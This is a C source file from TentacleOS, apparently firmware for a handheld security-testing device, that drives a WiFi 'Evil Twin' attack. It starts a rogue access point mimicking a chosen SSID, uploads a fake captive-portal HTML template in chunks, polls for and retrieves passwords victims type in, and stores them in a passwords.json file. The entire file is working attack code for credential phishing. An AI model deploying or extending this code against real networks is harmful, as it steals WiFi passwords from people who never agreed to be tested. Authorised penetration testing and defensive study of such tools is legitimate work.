// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "evil_twin.h"

#include "led_control.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include "esp_log.h"

#include "spi_bridge.h"
#include "spi_session.h"
#include "tos_storage_paths.h"
#include "storage_read.h"
#include "storage_write.h"
#include "storage_assets.h"
#include "cJSON.h"

static const char *TAG = "EVIL_TWIN";

#define EVIL_TWIN_MAX_SSID_LEN      32
#define EVIL_TWIN_MAX_TEMPLATE_LEN  127
#define EVIL_TWIN_MAX_PASSWORD_LEN  64
#define EVIL_TWIN_MAX_TEMPLATE_SIZE 8192
#define EVIL_TWIN_MAX_CHUNK_SIZE    252
#define EVIL_TWIN_PASSWORD_BUF_SIZE 2048

static bool s_has_password = false;
static uint32_t s_session_id = SPI_SESSION_INVALID_ID;

void evil_twin_start_attack(const char *ssid) {
  if (ssid == NULL)
    return;
  size_t len = strnlen(ssid, EVIL_TWIN_MAX_SSID_LEN);
  s_session_id =
      spi_session_start(SPI_ID_WIFI_APP_EVIL_TWIN, (uint8_t *)ssid, (uint8_t)len, NULL, NULL);
  if (s_session_id != SPI_SESSION_INVALID_ID) {
    s_has_password = false;
    led_signal_info();
  } else {
    ESP_LOGW(TAG, "Failed to start Evil Twin over SPI");
    led_signal_error();
  }
}

void evil_twin_start_attack_with_template(const char *ssid, const char *template_path) {
  if (ssid == NULL)
    return;
  size_t ssid_len = strnlen(ssid, EVIL_TWIN_MAX_SSID_LEN);
  size_t tmpl_len = template_path != NULL ? strnlen(template_path, EVIL_TWIN_MAX_TEMPLATE_LEN) : 0;
  if (ssid_len == 0)
    return;
  if (tmpl_len > EVIL_TWIN_MAX_TEMPLATE_LEN)
    tmpl_len = EVIL_TWIN_MAX_TEMPLATE_LEN;

  uint8_t payload[1 + EVIL_TWIN_MAX_SSID_LEN + 1 + EVIL_TWIN_MAX_TEMPLATE_LEN];
  payload[0] = (uint8_t)ssid_len;
  memcpy(payload + 1, ssid, ssid_len);
  payload[1 + ssid_len] = (uint8_t)tmpl_len;
  if (tmpl_len > 0) {
    memcpy(payload + 1 + ssid_len + 1, template_path, tmpl_len);
  }
  if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TEMPLATE,
                              payload,
                              (uint8_t)(1 + ssid_len + 1 + tmpl_len),
                              NULL,
                              NULL,
                              0,
                              2000) == ESP_OK) {
    s_has_password = false;
    led_signal_info();
  } else {
    ESP_LOGW(TAG, "Failed to start Evil Twin (template) over SPI");
    led_signal_error();
  }
}

void evil_twin_stop_attack(void) {
  if (s_session_id != SPI_SESSION_INVALID_ID) {
    spi_session_stop(s_session_id);
    s_session_id = SPI_SESSION_INVALID_ID;
  }
}

void evil_twin_reset_capture(void) {
  spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_RESET_CAPTURE, NULL, 0, NULL, NULL, 0, 2000);
  s_has_password = false;
}

bool evil_twin_has_password(void) {
  spi_header_t resp;
  uint8_t payload[1] = {0};
  if (spi_bridge_send_command(
          SPI_ID_WIFI_EVIL_TWIN_HAS_PASSWORD, NULL, 0, &resp, payload, sizeof(payload), 1000) ==
      ESP_OK) {
    s_has_password = (payload[0] != 0);
  }
  return s_has_password;
}

void evil_twin_get_last_password(char *out_buf, size_t len) {
  if (out_buf == NULL || len == 0)
    return;
  spi_header_t resp;
  uint8_t payload[EVIL_TWIN_MAX_PASSWORD_LEN] = {0};
  if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_GET_PASSWORD,
                              NULL,
                              0,
                              &resp,
                              payload,
                              sizeof(payload),
                              sizeof(payload)) == ESP_OK) {
    payload[sizeof(payload) - 1] = '\0';
    strncpy(out_buf, (char *)payload, len - 1);
    out_buf[len - 1] = '\0';
    s_has_password = (out_buf[0] != '\0');
    return;
  }
  out_buf[0] = '\0';
}

bool evil_twin_upload_template(const char *path) {
  if (path == NULL)
    return false;

  // Try SD first, then flash assets
  char *html = NULL;
  size_t size = 0;

  FILE *f = fopen(path, "r");
  if (f != NULL) {
    fseek(f, 0, SEEK_END);
    size = (size_t)ftell(f);
    fseek(f, 0, SEEK_SET);
    if (size > 0 && size <= EVIL_TWIN_MAX_TEMPLATE_SIZE) {
      html = malloc(size);
      if (html != NULL)
        fread(html, 1, size, f);
    }
    fclose(f);
  }

  if (html == NULL) {
    html = (char *)storage_assets_load_file(path, &size);
  }

  if (html == NULL || size == 0) {
    ESP_LOGE(TAG, "Failed to read template: %s", path);
    return false;
  }

  // Send BEGIN with total size
  uint8_t begin_payload[2];
  begin_payload[0] = (uint8_t)(size & 0xFF);
  begin_payload[1] = (uint8_t)((size >> 8) & 0xFF);
  if (spi_bridge_send_command(
          SPI_ID_WIFI_EVIL_TWIN_TMPL_BEGIN, begin_payload, 2, NULL, NULL, 0, 2000) != ESP_OK) {
    free(html);
    ESP_LOGE(TAG, "Template BEGIN failed");
    return false;
  }

  // Send chunks
  size_t offset = 0;
  while (offset < size) {
    size_t chunk = size - offset;
    if (chunk > EVIL_TWIN_MAX_CHUNK_SIZE)
      chunk = EVIL_TWIN_MAX_CHUNK_SIZE;
    if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TMPL_CHUNK,
                                (uint8_t *)(html + offset),
                                (uint8_t)chunk,
                                NULL,
                                NULL,
                                0,
                                2000) != ESP_OK) {
      free(html);
      ESP_LOGE(TAG, "Template CHUNK failed at offset %u", (unsigned)offset);
      return false;
    }
    offset += chunk;
  }

  free(html);
  ESP_LOGI(TAG, "Template uploaded: %u bytes", (unsigned)size);
  return true;
}

void evil_twin_save_password(const char *password) {
  if (password == NULL || password[0] == '\0')
    return;

  const char *json_path = TOS_PATH_CAPTIVE "/passwords.json";

  cJSON *root = NULL;
  char buf[EVIL_TWIN_PASSWORD_BUF_SIZE];
  if (storage_read_string(json_path, buf, sizeof(buf)) == ESP_OK) {
    root = cJSON_Parse(buf);
  }
  if (root == NULL) {
    root = cJSON_CreateArray();
  }

  cJSON *entry = cJSON_CreateObject();
  cJSON_AddStringToObject(entry, "password", password);
  cJSON_AddItemToArray(root, entry);

  char *json_str = cJSON_PrintUnformatted(root);
  cJSON_Delete(root);
  if (json_str != NULL) {
    storage_write_string(json_path, json_str);
    free(json_str);
    ESP_LOGI(TAG, "Password saved to SD");
  }
}
